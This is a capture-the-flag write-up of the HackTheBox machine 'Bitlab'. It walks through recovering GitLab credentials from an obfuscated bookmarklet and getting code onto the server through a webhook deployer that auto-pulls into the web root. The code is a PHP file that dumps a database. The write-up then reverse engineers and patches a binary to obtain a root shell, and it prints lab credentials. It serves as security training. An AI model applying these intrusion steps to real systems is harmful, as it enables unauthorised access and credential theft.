---
title: "Bitlab - HackTheBox"
date: "2020-01-11"
tags: []
---

Let's start with a port scan:
```
$ nmap -A -T4 10.10.10.114
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-11 12:23 EST
Nmap scan report for 10.10.10.114
Host is up (0.058s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's visit the website on port 80:
![](/images/hackthebox/bitlab/bitlab.png)

This is a Gitlab server installation and trying common username and passwords
combinations or a bruteforce with Hydra does not gives us anything, but by
visiting the [Help](http://10.10.10.114/help/bookmarks.html) link in the bottom, we find an interesting page:

![](/images/hackthebox/bitlab/help.png)

The most interesting link is the last one, Gitlab login, which contains this
javascript function:
```js
javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```

It is obfuscated, so let's use a tool like `https://beautifier.io/` to improve
the readability:
```
javascript: (function() {
    var _0x4b18 = ["value", "user_login", "getElementById", "clave", "user_password", "11des0081x"];
    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()
```

And let's replace the variable with their values:

```
javascript: (function() {
    var _0x4b18 = ["value", "user_login", "getElementById", "clave", "user_password", "11des0081x"];
    document["getElementById"]("user_login")["value"] = "clave";
    document["getElementById"]("user_password")["value"] = "11des0081x";
})()
```

Basically what it does is it autocompletes the login form with `clave` as
username and `11des0081x` as password. After logging in we find two
repositories:
![](/images/hackthebox/bitlab/repositories.png)

This is the code of Deployer:
```php
<?php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),"\n";
}

echo "OK\n";
```
It does a Git pull automatically after a merge is done on the Profile
repository. Luckily for us, the Profile repository is cloned into the root of
the web server, and it's visitable by going on the user's settings (which is
strange, maybe it was an error).

Another interesting thing can be found in the user's snippets:
![](/images/hackthebox/bitlab/snippets.png)

The logical thing to do now is to try to use those credentials to dump the
table, so let's create a file called dump.php in the Profile repository and let's write the
following code:
```php
<?php
    $db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
    $result = pg_query($db_connection,"SELECT * FROM profiles;");
    var_dump(pg_fetch_all($result));
?>
```
After creating a merge request and accepting it, the Deployer project will
automatically pull the changes and the `dump.php` file will be visitable. Here
is it's output:
```json
array(1) {
  [0]=>
  array(3) {
    ["id"]=>
    string(1) "1"
    ["username"]=>
    string(5) "clave"
    ["password"]=>
    string(22) "c3NoLXN0cjBuZy1wQHNz=="
  }
}
```

The password looks like base64 and it gets decoded as `ssh-str0ng-p@ss`, but
there is an invalid padding, and the password is the actual base64 string. I
hate when in CTFs these things happen, it's just a loss of time.
So let's connect with SSH and let's get the user flag:
```
clave@bitlab:~$ wc -c user.txt
33 user.txt
```

# Privilege escalation
The first thing that jumped to my eyes is a file in user's home:
```
clave@bitlab:~$ ls
RemoteConnection.exe  user.txt
```

Let's copy it on our machine to analyze it:
`scp clave@10.10.10.114:/home/clave/RemoteConnection.exe .`

Using Ghidra to reverse engineer it we can find some interesting strings:
![](/images/hackthebox/bitlab/strings.png)

And those strings are used in this function:
{{< highlight C "linenos=table, hl_lines=71" >}}
/* WARNING: Could not reconcile some variable overlaps */

void FUN_00401520(void)

{
  LPCWSTR pWVar1;
  undefined4 ***pppuVar2;
  LPCWSTR lpParameters;
  undefined4 ***pppuVar3;
  int **in_FS_OFFSET;
  uint in_stack_ffffff44;
  undefined4 *puVar4;
  uint uStack132;
  undefined *local_74;
  undefined *local_70;
  DWORD local_6c;
  void *local_68 [4];
  undefined4 local_58;
  uint local_54;
  void *local_4c [4];
  undefined4 local_3c;
  uint local_38;
  undefined4 ***local_30 [4];
  int local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_004028e0;
  local_10 = *in_FS_OFFSET;
  uStack132 = DAT_00404018 ^ (uint)&stack0xfffffffc;
  *(int ***)in_FS_OFFSET = &local_10;
  local_6c = 4;
  local_14 = uStack132;
  GetUserNameW((LPWSTR)0x4,&local_6c);
  local_38 = 0xf;
  local_3c = 0;
  local_4c[0] = (void *)((uint)local_4c[0] & 0xffffff00);
  FUN_004018f0();
  local_8 = 0;
  FUN_00401260(local_68,local_4c);
  local_74 = &stack0xffffff60;
  local_8._0_1_ = 1;
  FUN_004018f0();
  local_70 = &stack0xffffff44;
  local_8._0_1_ = 2;
  puVar4 = (undefined4 *)(in_stack_ffffff44 & 0xffffff00);
  FUN_00401710(local_68);
  local_8._0_1_ = 1;
  FUN_00401040(puVar4);
  local_8 = CONCAT31(local_8._1_3_,3);
  lpParameters = (LPCWSTR)FUN_00401e6d();
  pppuVar3 = local_30[0];
  if (local_1c < 0x10) {
    pppuVar3 = local_30;
  }
  pWVar1 = lpParameters;
  pppuVar2 = local_30[0];
  if (local_1c < 0x10) {
    pppuVar2 = local_30;
  }
  while (pppuVar2 != (undefined4 ***)(local_20 + (int)pppuVar3)) {
    *pWVar1 = (short)*(char *)pppuVar2;
    pWVar1 = pWVar1 + 1;
    pppuVar2 = (undefined4 ***)((int)pppuVar2 + 1);
  }
  lpParameters[local_20] = L'\0';
  if (local_6c == L'clave') {
  ShellExecuteW((HWND)0x0,L"open",L"C:\\Program Files\\PuTTY\\putty.exe",lpParameters,(LPCWSTR)0x0, 10);
  }
  if (0xf < local_1c) {
    operator_delete(local_30[0]);
  }
  local_1c = 0xf;
  local_20 = 0;
  local_30[0] = (undefined4 ***)((uint)local_30[0] & 0xffffff00);
  if (0xf < local_54) {
    operator_delete(local_68[0]);
  }
  local_54 = 0xf;
  local_58 = 0;
  local_68[0] = (void *)((uint)local_68[0] & 0xffffff00);
  if (0xf < local_38) {
    operator_delete(local_4c[0]);
  }
  *in_FS_OFFSET = local_10;
  FUN_00401e78();
  return;
}
{{< /highlight >}}

It looks like it uses some functions to decrypt a password and use it to login
with PuTTY to a machine on line 71. The only problem is that the user that runs
the program must be named `Clave`, and this check is at address `0x401640`:
![](/images/hackthebox/bitlab/graph.png)

We can patch the program by editing `JNZ LAB_00401662` at address `0x401647` to `JMP 0x00401649` to
unconditionally jump, and running the patched program gets us a root shell on
the machine:
![](/images/hackthebox/bitlab/putty.png)

Cool! This was my first machine that needed reverse engineering so it took me a
while, and the important thing that we can learn is to not be lazy and use
strange methods to save passwords and important stuff.

Another way that this step could have been done is to use a debugger and put a breakpoint after the password gets decoded and read the memory:
```
Qf7]8YSV.wDNF*[7d?j&eD4^
```

Thanks for reading!
